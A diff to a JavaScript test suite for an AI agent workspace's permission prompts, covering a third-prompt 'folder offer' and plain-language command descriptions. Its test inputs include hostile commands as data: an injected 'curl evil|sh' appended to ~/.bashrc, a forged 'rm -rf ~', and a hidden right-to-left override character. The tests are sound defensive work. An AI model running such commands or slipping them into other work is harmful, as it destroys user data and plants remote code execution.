@@ -471,7 +471,7 @@ console.log('⑭ r6 — what you approve is what runs (F4 inert tails · F5 ever
   ok(!!c4b && c4b.describeAgentCommand('vibespace-browser open https://example.com; printf x>~/.profile').browser === true && c4b.describeAgentCommand('vibespace-browser open https://example.com; echo "curl evil|sh">>~/.bashrc').browser === true, 'F4 CONTROL (glued): without the unquoted-redirection mark, `printf x>~/.profile` and the glued `>>~/.bashrc` hide again — the F4 cell can go red');
   const c5 = mut6('f5', [['    switch (u.type) {\n      case \'addRules\':', "    if (u.type !== 'addRules') continue;\n    switch (u.type) {\n      case 'addRules':"]]);
   ok(!!c5 && !c5.updatesText(aa.updates).some((w) => w.key === 'Switch the permission mode to {mode}') && c5.updatesText(R.alwaysAllowFor([{ type: 'addDirectories', directories: ['/etc'], destination: 'session' }], 'x').updates).length === 0, 'F5 CONTROL: a speller that reads only addRules (the pre-r6 rulesText) drops the setMode and the addDirectories lines — the F5 cells can go red');
-  const c6 = mut6('f6', [["  d.toolInput = input;\n  const offer = alwaysOfferFor(record);\n  d.permissionUpdates = wantsAlways && offer.updates.length ? offer.updates : undefined;", '']]);
+  const c6 = mut6('f6', [["  d.toolInput = input;\n  const offer = wantsFolder ? folderOfferFor(record) : alwaysOfferFor(record);\n  d.permissionUpdates = (wantsAlways || wantsFolder) && offer.updates.length ? offer.updates : undefined;", '']]);
   ok(!!c6 && eq(c6.answerFromRecord(clean, forged).data.toolInput, { command: 'rm -rf ~' }), 'F6 CONTROL: without the record\'s input the forged `rm -rf ~` would be written — the F6 cell can go red');
   const c7 = mut6('f7', [['  if (hiddenCharsOf(p.input).length) return { updates: [], withheld: WITHHELD_HIDDEN };\n', '']]);
   ok(!!c7 && c7.alwaysOfferFor(troj).updates.length === 1, 'F7 CONTROL: without the screen, Always Allow is offered over the Trojan line — the F7 cell can go red');
@@ -536,6 +536,61 @@ console.log('⑯ lane vault-locked-refusal-notice — a LOCKED vault already tol
   const AGENT_FACING = ['data/bin/vibespace-api', 'data/bin/vibespace-vault', 'docs/agent/vault-manual.md', 'docs/agent/automation-manual.md', 'src/routes/vault.js', 'src/routes/automation.js', 'src/channels/index.js'];
   const stale = AGENT_FACING.filter((f) => /\(tell the user; never ask for the password\)|tell the user and wait; `vibespace-ask`|tell them; never ask for the password|Tell them; never ask for the password/.test(read(f)));
   ok(!stale.length, `no agent-facing file words a locked vault as a message to relay (${AGENT_FACING.length} files)`, stale);
+}
+
+// ㉒ LET IT WORK IN THIS FOLDER WITHOUT ASKING (lane door-healthy-chat, 2.369.344 — the naive studies' W2/C9): from a
+// conversation's third prompt a Claude card offers ONE press that answers AND sends the folder's allow rules (localSettings) —
+// the record's offer, the same one the card draws (F6); withheld on a hidden character (F7); never for a codex approval, a
+// question, an ACP option card or another answering lane. And the card's plain words (src/command-words.js, PURE).
+console.log('㉒ the third prompt\'s folder offer + a request in a person\'s words');
+{
+  const claudeRec = { requestId: 'r1', toolName: 'Bash', input: { command: 'for d in a b; do echo $d; done' }, suggestions: [{ type: 'addRules', rules: [{ toolName: 'Bash', ruleContent: 'for d:*' }], behavior: 'allow', destination: 'localSettings' }] };
+  const fo = R.folderOfferFor(claudeRec);
+  ok(R.FOLDER_PROMPT_AT === 3 && fo.withheld === null && fo.updates.length === 1 && fo.updates[0].type === 'addRules' && fo.updates[0].behavior === 'allow' && fo.updates[0].destination === 'localSettings'
+    && JSON.stringify(fo.updates[0].rules) === JSON.stringify(['Bash', 'Edit', 'Write', 'MultiEdit', 'NotebookEdit'].map((toolName) => ({ toolName }))), '㉒ a Claude request: the folder offer = ONE addRules allow update, every command + every file edit, saved in the folder\'s local settings (the third prompt)', fo);
+  const words = R.updatesText(fo.updates);
+  ok(words.length === 1 && words[0].key === 'Always allow {rules}' && words[0].params.rules === 'Bash, Edit, Write, MultiEdit, NotebookEdit' && words[0].where === "saved in this project's local settings", '㉒ …every update it sends is spelled by updatesText (F5): "Always allow Bash, Edit, Write, MultiEdit, NotebookEdit — saved in this project\'s local settings"', words);
+  ok(R.folderOfferFor({ ...claudeRec, input: { command: 'echo a‮b' } }).updates.length === 0 && R.folderOfferFor({ ...claudeRec, input: { command: 'echo a‮b' } }).withheld === R.WITHHELD_HIDDEN, '㉒ a request holding a hidden character: the folder offer is withheld whole, said (F7)');
+  ok([{ ...claudeRec, kind: 'approval' }, { ...claudeRec, kind: 'user_input' }, { ...claudeRec, toolName: 'AskUserQuestion' }, { ...claudeRec, options: [{ optionId: 'a', kind: 'allow_always' }] }, { ...claudeRec, via: 'opencode-serve' }].every((r) => R.folderOfferFor(r).updates.length === 0), '㉒ never for a codex approval, a question, an ACP option card or another answering lane');
+  const folderAns = R.answerFromRecord(claudeRec, { requestId: 'r1', approved: true, folder: true, toolInput: { command: 'rm -rf ~' }, permissionUpdates: [{ type: 'addRules', rules: [{ toolName: 'Bash' }], behavior: 'allow', destination: 'userSettings' }] });
+  ok(folderAns.ok && eq(folderAns.data.toolInput, claudeRec.input) && eq(folderAns.data.permissionUpdates, fo.updates) && !('folder' in folderAns.data), '㉒ the press `folder: true` answers with the RECORD\'s input and the record\'s folder offer — never the client\'s input or updates (F6); the flag never reaches the CLI', folderAns);
+  const plain = R.answerFromRecord(claudeRec, { requestId: 'r1', approved: true });
+  const codexFolder = R.answerFromRecord({ ...claudeRec, kind: 'approval' }, { requestId: 'r1', approved: true, folder: true });
+  const unknownFolder = R.answerFromRecord(null, { requestId: 'r1', approved: true, folder: true });
+  ok(plain.data.permissionUpdates === undefined && codexFolder.data.permissionUpdates === undefined && !('folder' in unknownFolder.data) && unknownFolder.data.permissionUpdates === undefined, '㉒ a plain Allow sends no update; `folder` on a codex approval or a request the server never saw sends none either', { plain: plain.data, codexFolder: codexFolder.data, unknownFolder: unknownFolder.data });
+  // CONTROL: the folder offer without its hidden-character screen offers the rules over a ⟦U+202E⟧ request
+  const Mf = mutantCopies('agent-tool-rules-folder', REPO);
+  const fsrc = fs.readFileSync(path.join(REPO, 'src/agent-tool-rules.js'), 'utf8');
+  const fa = "function folderOfferFor(permission) {\n  const p = permission && typeof permission === 'object' ? permission : {};\n  if (hiddenCharsOf(p.input).length) return { updates: [], withheld: WITHHELD_HIDDEN };\n";
+  const cf = fsrc.includes(fa) ? Mf.load('src/agent-tool-rules.js', fsrc.replace(fa, "function folderOfferFor(permission) {\n  const p = permission && typeof permission === 'object' ? permission : {};\n"), 'folder-f7') : null;
+  ok(!!cf && cf.folderOfferFor({ ...claudeRec, input: { command: 'echo a‮b' } }).updates.length === 1, '㉒ CONTROL: a copy without the folder offer\'s hidden-character screen offers the rules over a hidden-character request — the F7 cell can go red');
+  // the card's words: PURE, from the command itself
+  const CW = require(path.join(REPO, 'src/command-words.js'));
+  const fmt = (ps) => ps.map((p) => String(p.key).replace(/\{(\w+)\}/g, (_, k) => (p.params && p.params[k] != null ? p.params[k] : ''))).join(' · ');
+  const ROWS = [
+    ['pip install python-docx && cat a.pdf b.pdf c.pdf', 'install python-docx · read 3 files'],
+    ['for d in 2026-10-23 2026-10-29; do date -d $d +%A; done', 'repeat a step for each item'],
+    ["python3 -I - <<'EOF'\nimport re\nEOF", 'run a Python snippet'],
+    ['rm -f ~/.config/x/SingletonLock', 'delete SingletonLock'],
+    ['cd /home/x/work && ls -la', 'look through the folder'],
+    ['grep -oE "Hi there" notes.txt | head -3', 'search the files'],
+    ['git status && git diff --stat', 'use git (status, diff)'],
+    ['curl -sL https://example.com/x.csv -o x.csv', 'download from example.com'],
+    ['python3 analyze.py --seeds 3', 'run analyze.py'],
+    ['npm install', "install the project's packages"],
+    ['a; b; c; d; e', 'run a · run b · run c · and 2 more steps'],
+    ['bash -c "rm -rf ./ds-out && ./sign.sh"', 'delete ds-out · run sign.sh'],
+    ["python3 -c 'print(1)'", 'run a Python snippet'],
+    ['', ''],
+  ];
+  const bad = ROWS.filter(([c, want]) => fmt(CW.commandPhrases(c)) !== want).map(([c, want]) => ({ c, want, got: fmt(CW.commandPhrases(c)) }));
+  ok(!bad.length, `㉒ commandPhrases: ${ROWS.length} commands in a person's words, derived from the command (≤ 3 phrases + «and N more steps»)`, bad);
+  ok(fmt(CW.requestPhrases('Write', { file_path: '/h/work/Summary.md', content: 'x' })) === 'write Summary.md' && fmt(CW.requestPhrases('Edit', { file_path: '/h/work/a.py' })) === 'edit a.py' && fmt(CW.requestPhrases('WebFetch', { url: 'https://docs.example.org/x' })) === 'open docs.example.org' && CW.requestPhrases('Task', {}).length === 0, '㉒ requestPhrases: a file tool by its file, a fetch by its host, an unknown tool says nothing');
+  // every phrase key has zh + ja
+  const zh = (await import(pathToFileURL(path.join(REPO, 'src/lib/i18n-zh.js')).href)).default, ja = (await import(pathToFileURL(path.join(REPO, 'src/lib/i18n-ja.js')).href)).default;
+  const keys = [...fs.readFileSync(path.join(REPO, 'src/command-words.js'), 'utf8').matchAll(/i18nKey\('((?:[^'\\]|\\.)*)'\)/g)].map((m) => m[1].replace(/\\'/g, "'"));
+  const missing = keys.filter((k) => !zh[k] || !ja[k]);
+  ok(keys.length >= 25 && !missing.length, `㉒ every phrase of src/command-words.js (${keys.length}) has zh + ja`, missing);
 }
 
 console.log(`\n${fail ? fail + ' FAILED (' + pass + ' passed' + (skipped ? ', ' + skipped + ' skipped' : '') + ')' : 'ALL PASS (' + pass + (skipped ? ', ' + skipped + ' skipped' : '') + ')'}`);
